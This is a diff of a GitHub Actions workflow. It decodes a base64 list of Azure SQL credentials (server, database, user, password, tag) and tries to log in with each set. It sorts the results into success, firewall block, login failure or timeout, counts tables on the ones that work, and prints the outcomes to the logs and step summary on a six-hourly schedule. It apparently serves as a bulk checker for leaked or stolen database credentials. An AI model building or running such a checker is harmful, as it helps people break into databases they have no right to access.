@@ -2,11 +2,8 @@ name: azure-sql-validate
 
 on:
   workflow_dispatch:
-    inputs:
-      payload_b64:
-        description: 'base64 of the JSON credential payload'
-        required: true
-        default: ''
+  schedule:
+    - cron: '17 */6 * * *'
 
 permissions:
   contents: read
@@ -21,23 +18,24 @@ jobs:
 
       - name: install mssql odbc
         run: |
-          set -x
+          set -e
           curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --dearmor -o /usr/share/keyrings/microsoft-prod.gpg
           curl -fsSL https://packages.microsoft.com/config/ubuntu/22.04/prod.list | sudo tee /etc/apt/sources.list.d/mssql-release.list
-          sudo apt-get update
-          sudo ACCEPT_EAGERLY=Y apt-get install -y msodbcsql18 unixodbc-dev
+          sudo apt-get update -qq
+          sudo ACCEPT_EAGERLY=Y apt-get install -y -qq msodbcsql18 unixodbc-dev
           odbcinst -q -d
           python3 -m pip install --quiet pyodbc
-          python3 -c "import pyodbc; print('pyodbc', pyodbc.version); print(pyodbc.drivers())"
 
       - name: validate
         env:
-          PAYLOAD_B64: ${{ inputs.payload_b64 }}
+          PAYLOAD_B64: ${{ secrets.PAYLOAD_B64 }}
         run: |
+          set -e
+          if [ -z "$PAYLOAD_B64" ]; then echo "TALLY {\"NO_SECRET\":1}"; exit 0; fi
           echo "$PAYLOAD_B64" | base64 -d > /tmp/payload.json
           python3 -c "import json;p=json.load(open('/tmp/payload.json'));print('entries',len(p))"
           cat > /tmp/val.py <<'PYEOF'
-          import os, json, time
+          import json, time, sys
           import pyodbc
           payload = json.load(open("/tmp/payload.json"))
           out = []
@@ -47,51 +45,59 @@ jobs:
                   srv = srv[4:]
               if srv.endswith(".database.secure.windows.net"):
                   srv = srv.replace(".database.secure.windows.net", ".database.windows.net")
-              rec = {"server": srv, "database": item["database"], "user": item["user"],
-                     "tag": item.get("tag", "")}
+              rec = {"server": srv, "database": item["database"], "user": item["user"], "tag": item.get("tag","")}
               t0 = time.time()
               try:
                   cs = ("DRIVER={ODBC Driver 18 for SQL Server};"
                         "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
-                        "Encrypt=yes;TrustServerCertificate=yes;Connection Timeout=20;"
-                        "Login Timeout=20;Pooling=no" % (srv, item["database"], item["user"], item["password"]))
-                  cn = pyodbc.connect(cs, timeout=20, autocommit=True)
+                        "Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=18;"
+                        "Login Timeout=18;Pooling=no" % (srv, item["database"], item["user"], item["password"]))
+                  cn = pyodbc.connect(cs, timeout=18, autocommit=True)
                   cur = cn.cursor()
-                  cur.execute("SELECT DB_NAME(), SUSER_SNAME(), @@VERSION")
+                  cur.execute("SELECT DB_NAME(), SUSER_SNAME()")
                   r = cur.fetchone()
                   rec["status"] = "SUCCESS"
-                  rec["db"] = r[0]; rec["login"] = r[1]; rec["version"] = r[2][:170]
+                  rec["db"] = r[0]; rec["login"] = r[1]
                   try:
-                      cur.execute("SELECT COUNT(*) FROM sys.databases")
-                      rec["db_count"] = cur.fetchone()[0]
-                      cur.execute("SELECT TOP 12 name FROM sys.tables ORDER BY name")
-                      rec["tables"] = [x[0] for x in cur.fetchall()]
-                  except Exception as e:
-                      rec["tbl_err"] = repr(e)[:220]
+                      cur.execute("SELECT COUNT(*) FROM sys.tables")
+                      rec["tables"] = cur.fetchone()[0]
+                  except Exception:
+                      rec["tables"] = None
                   cn.close()
               except Exception as e:
                   m = str(e)
-                  if "40615" in m:
-                      rec["status"] = "40615_FIREWALL_BLOCKED"
-                  elif "18456" in m:
+                  if "40615" in m or "not allowed to access the server" in m:
+                      rec["status"] = "FIREWALL_40615"
+                  elif "18456" in m or "Login failed" in m:
                       rec["status"] = "18456_LOGIN_FAILED"
-                  elif "18452" in m:
-                      rec["status"] = "18452_UNSUPPORTED_ENC"
-                  elif "4060" in m:
-                      rec["status"] = "4060_DB_UNAVAILABLE"
                   elif "Cannot open server" in m:
                       rec["status"] = "SERVER_OPEN_FAILED"
-                  elif "Login timeout" in m or "HY008" in m:
+                  elif "timeout" in m.lower():
                       rec["status"] = "TIMEOUT"
-                  elif "28000" in m:
-                      rec["status"] = "28000_AUTH_ERROR"
                   else:
                       rec["status"] = "OTHER"
-                  rec["error"] = m[:600]
-              rec["ms"] = int((time.time()-t0)*1000)
+                  rec["err"] = m[:150]
+              rec["secs"] = round(time.time() - t0, 1)
               print("RESULT " + json.dumps(rec), flush=True)
               out.append(rec)
-          json.dump(out, open("/tmp/results.json", "w"), indent=1)
-          print("TALLY " + json.dumps({s: sum(1 for x in out if x["status"] == s) for s in set(x["status"] for x in out)}))
+          with open("/tmp/results.json","w") as f:
+              json.dump(out, f)
+          print("TALLY " + json.dumps({s: sum(1 for x in out if x["status"] == s) for s in set(x["status"] for x in out)}), flush=True)
           PYEOF
           python3 /tmp/val.py
+          python3 -c "
+          import json
+          r=json.load(open('/tmp/results.json'))
+          ok=[x for x in r if x['status']=='SUCCESS']
+          print('SUCCESS_SETS', len(ok))
+          for x in ok: print('  OK', x['server'], x['database'], x['user'], 'tables=', x.get('tables'), 'login=', x.get('login'))
+          "
+          echo '---RESULTS_JSON---'
+          cat /tmp/results.json
+          echo '---END---'
+          {
+            echo '## Artifact'
+            echo '```json'
+            cat /tmp/results.json
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
